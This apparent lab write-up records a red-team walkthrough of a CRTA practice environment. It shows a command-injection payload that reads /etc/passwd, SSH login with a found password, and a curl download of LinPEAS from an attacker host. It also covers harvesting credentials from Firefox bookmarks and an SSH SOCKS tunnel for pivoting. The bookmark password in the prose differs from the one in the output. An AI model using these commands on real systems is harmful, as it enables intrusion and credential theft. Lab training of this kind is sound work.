<p class="indent-paragraph">
The primary objective of this Red Team Operation is to assess the security posture of the enterprise environment. The engagement aims to identify vulnerabilities, and misconfigurations in the AD environment and provide actionable recommendations for enhancing the security of the infrastructure.
</p>

<p class="indent-paragraph">
Below is the achievement badge earned upon completing this machine, validating the successful exploitation of all required objectives.
</p><br>

<div style="text-align: center; margin-top: 1em;">
  <a href="https://labs.cyberwarfare.live/badge/image/681fb675696368ff56f09813" target="_blank" style="text-decoration: none; font-family: monospace; background: #0f0f0f; color: #00bfff; padding: 6px 12px; border: 1px solid #00bfff; border-radius: 6px; display: inline-block;">CRTA Practise Lab Badge</a>
</div><br>

---

<p class="indent-paragraph">
The scope for this assessment includes remote access via VPN and the following IP ranges within the lab environment:
</p>

<div style="display: flex; justify-content: center; margin: 2em 0;">
  <table style="border-collapse: collapse; border: 1px solid #444; min-width: 420px;">
    <thead>
      <tr>
        <th style="border: 1px solid #555; padding: 8px 16px; text-align: center;">FIELD</th>
        <th style="border: 1px solid #555; padding: 8px 16px; text-align: center;">VALUE</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td style="border: 1px solid #555; padding: 8px 16px;">VPN IP Range</td>
        <td style="border: 1px solid #555; padding: 8px 16px;">10.10.200.0/24</td>
      </tr>
      <tr>
        <td style="border: 1px solid #555; padding: 8px 16px;">External IP Range</td>
        <td style="border: 1px solid #555; padding: 8px 16px;">192.168.80.0/24</td>
      </tr>
      <tr>
        <td style="border: 1px solid #555; padding: 8px 16px;">Internal IP Range</td>
        <td style="border: 1px solid #555; padding: 8px 16px;">192.168.98.0/24</td>
      </tr>
    </tbody>
  </table>
</div>

### 🧩 Enumeration and Initial Access

<p class="indent-paragraph">
The reconnaissance phase commenced with identification of the external and internal IP ranges defined in the lab scope: <code>192.168.80.0/24</code> and <code>192.168.98.0/24</code><span class="codefix">.</span> These subnets typically host infrastructure components such as perimeter services, internal servers, and domain resources. The addresses <code>192.168.80.1</code> and <code>192.168.98.1</code> were explicitly excluded from testing, as they fall outside the authorized engagement scope. With these constraints enforced, enumeration focused solely on the approved ranges to discover active hosts and map the initial attack surface.
</p>

```
~$ nmap -sn 192.168.80.2-254

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 14:14 MDT
Nmap scan report for 192.168.80.10
Host is up (0.17s latency).
Nmap done: 253 IP addresses (1 host up) scanned in 12.42 seconds
```

<p class="indent-paragraph">
Once the only live host in the external network (<code>192.168.80.10</code>) was identified, a service enumeration scan was performed to discover running applications and collect version information. The scan employed the <code>-sC</code> flag for default NSE scripts, <code>-sV</code> for service/version detection, <code>-p-</code> to probe all 65 535 TCP ports, and <code>-T4</code> to optimize speed without excessive aggression.
</p>
<p class="indent-paragraph">
This enumeration phase established the foundation for deeper analysis. Subsequent steps will involve interacting with the HTTP service to examine its structure, uncover hidden paths, and identify potential input vectors for exploitation.
</p>

```
~$ nmap -sC -sV -p- -T4 192.168.80.10 2>/dev/null

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 14:33 MDT
Warning: 192.168.80.10 giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.80.10
Host is up (0.22s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 8d:c3:a7:a5:bf:16:51:f2:03:85:a7:37:ee:ae:8d:81 (RSA)
|   256  9a:b2:73:5a:e5:36:b4:91:8d:8c:f7:4a:d0:15:65:28 (ECDSA)
|_  256  3c:16:a7:6a:b6:33:c5:83:ab:7f:99:60:6a:4c:09:11 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Cyber WareFare Labs
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 754.45 seconds
```

<p class="indent-paragraph">
To streamline operations and eliminate the need to repeatedly type the raw IP address, the target <code>192.168.80.10</code> was mapped to a custom hostname via the local resolver configuration.
</p>

```
~$ sudo nano /etc/hosts

192.168.80.10 ecommerce.lab
```

<p class="indent-paragraph">
Navigation to <code>ecommerce.lab</code> revealed a login portal for a platform identified as <code>Cyberwarops E-commerce</code><span class="codefix">.</span> This page corresponded to the HTTP title observed during the Nmap scan. A “Sign Up” link was located beneath the login form, directing to the user registration endpoint at <code>http://ecommerce.lab/registration.php</code><span class="codefix">.</span>
</p>
<p class="indent-paragraph">
  <img src="/img/redteam/cwl/crta-http-login.png" alt="login page cyberwarcops" style="width:100%; border-radius:6px; margin-top: 1em;" />
</p>

<p class="indent-paragraph">
During exploration of the authenticated area at <code>http://ecommerce.lab/dashboard1.php</code><span class="codefix">,</span> a newsletter subscription field was identified that accepts an email address as input. Submitting this form produced a JavaScript alert with the message <code>alert("Thanks for subcribing ..!")</code><span class="codefix">.</span>
</p>
<p class="indent-paragraph">
  <img src="/img/redteam/cwl/crta-newsletter-email.png" alt="Thanks for subcribing" style="width:100%; border-radius:6px; margin-top: 1em;" />
</p>

### 🧨 Command Injection via Email Parameter

<p class="indent-paragraph">
The output of raw <code>&lt;script&gt;</code> tags demonstrates that the server dynamically generates JavaScript based on user input. This strongly suggests that the `EMAIL` parameter is executed by the underlying system shell without proper validation or sanitization. A POST request with <code>EMAIL=cat /etc/passwd</code> was crafted to confirm the injection point, resulting in disclosure of the <code>/etc/passwd</code> file. This confirms the presence of an unauthenticated command injection vulnerability.
</p>
<p class="indent-paragraph">
  <img src="/img/redteam/cwl/crta-command-injection-email.png" alt="Command Injection via Email Parameter" style="width:100%; border-radius:6px; margin-top: 1em;" />
</p>

### 🔐 Remote Shell Access via SSH

<p class="indent-paragraph">
After confirming command injection and file enumeration, a local user account named <code>privilege</code> with a valid login shell <code>(/bin/bash)</code> was identified. Common credentials were tested, ultimately allowing successful SSH authentication using the discovered password. This connection verified that the <code>privilege</code> account has remote shell access to the server, presenting a standard bash shell with no additional restrictions.
</p>

```
~$ sshpass -p Admin@962 ssh privilege@192.168.80.10
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-67-generic x86_64)

Last login: Sat Apr 19 22:44:58 2025 from <IP>
```

<p class="indent-paragraph">
After obtaining a stable shell as the <code>privilege</code> user, basic system enumeration was conducted to identify potential privilege escalation vectors, running services, misconfigurations, and sensitive files. LinPEAS, a widely used Linux post-exploitation enumeration tool, was chosen for its comprehensive checks. The tool was transferred to the target via a silent HTTP download to avoid generating on-screen output or error messages, with the <code>-s</code> option enabling silent mode and <code>2&gt;/dev/null</code> suppressing any error messages to ensure the download remained discreet.
</p>

```
~$ privilege@ubuntu-virtual-machine:/tmp$ curl -s -o linpeas.sh http://<IP>:8000/linpeas.sh 2>/dev/null

~$ privilege@ubuntu-virtual-machine:/tmp$ ll
total 932

drwxrwxrwt 22 root root    4096 Apr 26 22:48 .
drwxr-xr-x 20 root root    4096 Dec 20 08:10 ..
-rw-r--r--  1 privilege privilege       0 Jan 21 17:19 config-err-Rt6GJK
drwxr-xr-x  2 root      root    4096 Jan 21 17:06 .font-unix
drwxrwxrwt  2 privilege privilege       4096 Jan 21 17:19 .ICE-unix
-rw-r--r--  1 privilege privilege 853290 Apr 26 22:48 linpeas.sh
drwx------  2 root      root    4096 Jan 21 17:06 snap-private-tmp/
drwx------  2 privilege privilege    4096 Jan 21 17:19 ssh-lZdebRLpSqW2/
drwx------  2 root      root    4096 Jan 21 17:06 systemd-private-dafd168f87334d24b5df59ebe8bae57a7-apache2.service-3WBmph/
drwx------  2 root      root    4096 Jan 21 17:06 systemd-private-dafd168f87334d24b5df59ebe8bae57a7-colord.service-jrbf2e/
drwx------  2 root      root    4096 Jan 21 17:06 systemd-private-dafd168f87334d24b5df59ebe8bae57a7-fwpumd.service-M4u89g/
drwx------  2 root      root    4096 Jan 21 17:06 systemd-private-dafd168f87334d24b5df59ebe8bae57a7-ModemManager.service-ryXuJj/
drwx------  2 root      root    4096 Jan 21 17:06 systemd-private-dafd168f87334d24b5df59ebe8bae57a7-switcheroo-control.service-DNaKQh/
drwx------  2 root      root    4096 Jan 21 17:06 systemd-private-dafd168f87334d24b5df59ebe8bae57a7-systemd-logind.service-cZHPcj/
drwx------  2 root      root    4096 Jan 21 17:06 systemd-private-dafd168f87334d24b5df59ebe8bae57a7-systemd-resolved.service-Q8h7vg/
drwx------  2 root      root    4096 Jan 21 17:06 systemd-private-dafd168f87334d24b5df59ebe8bae57a7-systemd-timesyncd.service-cmxtvf/
drwx------  2 root      root    4096 Jan 21 17:06 systemd-private-dafd168f87334d24b5df59ebe8bae57a7-upower.service-bejEXh/
drwxrwxrwt  2 privilege privilege    4096 Apr 26 22:26 .Test-unix/
drwxr-xr-x  2 gdm       gdm     4096 Jan 21 17:06 tracker-extract-files.1001/
drwxrwxrwt  2 root      root    4096 Jan 21 17:06 vmwareDnD/
drwxr-xr-x  2 root      root    4096 Jan 21 17:06 vmware-root_669-3980232826/
-rw-r--r--  1 gdm       gdm       11 Jan 21 17:06 .X1024-lock
-rw-r--r--  1 gdm       gdm       11 Jan 21 17:06 .X1025-lock
drwxr-xr-x  2 root      root    4096 Jan 21 17:19 .X11-unix
drwxr-xr-x  2 root      root    4096 Jan 21 17:19 .XIM-unix
```

<p class="indent-paragraph">
After confirming the successful download to <code>/tmp</code><span class="codefix">,</span> the <code>linpeas.sh</code> script was executed to perform a deeper enumeration of the environment. During its run, LinPEAS revealed multiple Firefox-related artifacts within the user’s home directory at <code>/home/privilege/.mozilla/firefox/</code><span class="codefix">,</span> suggesting prior browser activity and potential credential storage.
</p>

```
~$ ./linpeas.sh > linpeas-output.txt

➜ Found interesting column names in nmo:Email_nmo:contentMimeType (output limit 10)
CREATE TABLE IF NOT EXISTS "nmo:Email_nmo:contentMimeType" (
  ID INTEGER NOT NULL,
  "nmo:contentMimeType" TEXT NOT NULL,
  "nmo:contentMimeType:graph" INTEGER
);

➜ Extracting tables from /home/privilege/.local/share/evolution/addressbook/system/contacts.db (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/cert9.db (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/content-prefs.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/cookies.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/credentialstate.sqlite (limit 20)
➜ Found interesting column names in identity (output limit 10)
CREATE TABLE identity (
  rpOrigin TEXT NOT NULL,
  idpOrigin TEXT NOT NULL,
  credentialId TEXT NOT NULL,
  registered INTEGER,
  allowLogout INTEGER,
  modificationTime INTEGER,
  rpBaseDomain TEXT,
  PRIMARY KEY (rpOrigin, idpOrigin, credentialId)
);

➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/favicons.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/formhistory.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/key4.db (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/permissions.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/places.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/protections.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/storage/default/https+++gofile.io/ls/data.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/storage/ls-archive.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/storage/permanent/chrome/idb/1451318868ntourmalonadry-eprc.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/storage/permanent/chrome/idb/1657114595AmcateirqvistStiy.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/storage/permanent/chrome/idb/2823318777ntourmalonadry-naod.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/storage/permanent/chrome/idb/2918063365piupsah.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/storage/permanent/chrome/idb/3561288849sdihlre.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/storage/permanent/chrome/idb/3870112724resgnmoitte-s.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/storage.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/webappsstore.sqlite (limit 20)
➜ Extracting tables from /home/ubuntu/.cache/tracker/meta.db (limit 20)
➜ Found interesting column names in ncal:UnionParentClass (output limit 10)
```

### 🔎 Extracting Recent Firefox Browser History

<p class="indent-paragraph">
  With access to the Firefox profile at <code>~/.mozilla/firefox/b2rri1qd.default-release/</code><span class="codefix">,</span> the investigator located the <code>places.sqlite</code> database, which houses browsing history and bookmark data. The SQLite query retrieved the ten most recently accessed URLs from the Firefox profile. The results reveal repeated visits to local endpoints (for example, <code>http://127.0.0.1/registration.php</code> and <code>http://127.0.0.1/dashboard1.php</code>) alongside accesses to external file-sharing services on <code>gofile.io</code><span class="codefix">,</span> including a direct download link to <code>Web.zip</code><span class="codefix">.</span> These patterns indicate that the system was being used for local web-application testing and distribution, consistent with a development or deployment workflow.
</p>

```
~$ privilege@ubuntu-virtual-machine:~$ sqlite3 ~/.mozilla/firefox/b2rri1qd.default-release/places.sqlite "SELECT url FROM moz_places ORDER BY last_visit_date DESC LIMIT 10;"

http://127.0.0.1/registration.php
http://127.0.0.1/
http://127.0.0.1/index.php
http://127.0.0.1/logout.php?logout
http://127.0.0.1/Template%20Main/Template%20Main/images/9.jpg
http://127.0.0.1/dashboard1.php
https://store4.gofile.io/download/web/fe8132dc-dc74-4fd4-8e3a-bef8aee41a8e/Web.zip
https://gofile.io/d/LK6s4P
https://gofile.io/d/LK6s4P
https://gofile.io/d/LK6s4P
```

<p class="indent-paragraph">
   To extract the stored bookmarks, the <code>sqlite3</code> utility was used to query the <code>moz_bookmarks</code> table. Among the default entries, one custom bookmark stood out: <code>http://192.168.98.30/admin/index.php?user=john@child.warfare.corp&amp;pass=User10#%$!</code><span class="codefix">.</span> This entry suggests the existence of an administrative panel hosted at <code>192.168.98.30</code><span class="codefix">,</span> which is part of the internal subnet previously discovered (<code>192.168.98.0/24</code>). More importantly, the bookmark includes embedded credentials in the URL query string.
</p>

```
~$ privilege@ubuntu-virtual-machine:~$ sqlite3 ~/.mozilla/firefox/b2rri1qd.default-release/places.sqlite "SELECT * FROM moz_bookmarks;"

1|2|1|0|menu|1737028376389000|1737028407427000|root_______|1|1
2|2|1|0|menu|1737028376389000|1737028376683000|menu_______|1|3
3|2|1|1|toolbar|1737028376389000|1737028376773000|toolbar____|1|3
4|2|1|2|tags|1737028376389000|1737028376389000|tags________|1|1
5|2|1|3|unfiled|1737028376389000|1737028407427000|unfiled____|1|2
6|2|1|4|mobile|1737028376397000|1737028376662000|mobile______|1|2
7|2|2|0|Mozilla Firefox|1737028376683000|1737028376683000|2hcCSTYguEk2|0|1
8|1|3|7|0|Get Help|1737028376683000|1737028376683000|w8hhWMYvmHY6|0|1
9|1|4|7|1|Customize Firefox|1737028376683000|1737028376683000|uctFzas86dQw|0|1
10|1|5|7|2|Get Involved|1737028376683000|1737028376683000|2-X79YDQmgEh|0|1
11|1|6|7|3|About Us|1737028376683000|1737028376683000|GewYCw2g0FLJ|0|1
12|1|2|1|Ubuntu and Free Software links|1737028376683000|1737028376683000|MxAMPgqX16gZ|0|1
13|1|7|2|Ubuntu|||Qt4eHCSUhI0L|0|1
14|1|8|1|Ubuntu Wiki (community-edited website)|1737028376683000|1737028376683000|nbf_eTkjwhpvl|0|1
15|1|9|12|Make a Support Request to the Ubuntu Community|||ukdJ8dcfVTPm|0|1
16|1|10|13|Debian (Ubuntu is based on Debian)|||xg0MK5g3l2Zp|0|1
17|1|11|3|Getting Started|||Kt61Q_eV70GT|0|1
18|1|16|5|0|http://192.168.98.30/admin/index.php?user=john@child.warfare.corp&pass=User1a#$%6|||1737028407427000|173702966639000|1|7
```
### 🌐 Identifying Network Interfaces 

<p class="indent-paragraph">
The network interfaces were enumerated to determine which IPv4 subnets were reachable from the compromised host. By running <code>ip -4 a | grep inet</code><span class="codefix">,</span> the following addresses were identified, confirming the host bridges two distinct network segments:
</p>

```
~$ privilege@ubuntu-virtual-machine:~$ ip -4 a | grep inet

inet 127.0.0.1/8 scope host lo
inet 192.168.98.15/24 brd 192.168.98.255 scope global noprefixroute ens34
inet 192.168.80.10/24 brd 192.168.80.255 scope global noprefixroute ens32
```

<p class="indent-paragraph">
To quickly identify live hosts on the internal subnet <code>(192.168.98.0/24)</code><span class="codefix">,</span> a concise Python one-liner performed an ICMP sweep. The output revealed which systems were reachable and prioritized them for further exploration.
</p>

```
~$ privilege@ubuntu-virtual-machine:~$ python3 -c "import os; [os.system('ping -c 1 -W 1 192.168.98.%d >/dev/null 2>&1 && echo Host 192.168.98.%d is up' % (i, i)) for i in range(1, 255)]"

Host 192.168.98.2 is Up
Host 192.168.98.15 is Up
Host 192.168.98.30 is Up
Host 192.168.98.120 is Up
```

### 🔗 Proxychains for Stealthy Port & Service Enumeration

<p class="indent-paragraph">
Proxychains was installed on the machine attacker host and configured to route traffic through the SSH SOCKS4 proxy. The package was installed via:
</p>

```
~$ sudo apt install proxychains
```

<p class="indent-paragraph">
Next, the Proxychains configuration file was updated to include the SOCKS4 proxy directive at the end of <code>/etc/proxychains.conf</code><span class="codefix">.</span> This change ensures that all supported connections launched through Proxychains will be forwarded over the local SOCKS4 proxy provided by the SSH tunnel.
</p>

```
~$ nano /etc/proxychains.conf

socks4 127.0.0.1 9050
```

<p class="indent-paragraph">
To enable enumeration of the internal network <code>(192.168.98.0/24)</code> from the attacker’s host, a dynamic SSH tunnel was created using the compromised privilege user. This tunnel exposes a local SOCKS proxy on port <code>9050</code><span class="codefix">,</span> allowing proxy-aware tools to route traffic through the target environment as if they were directly connected to it.
</p>

```
~$ sshpass -p 'Admin@962' ssh -D 9050 privilege@192.168.80.10
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-67-generic x86_64)

Last login: Tue Apr 29 20:05:51 2025 from <IP>
```

### 🔁 Pivoting into the Internal Network using Ligolo-ng

</div>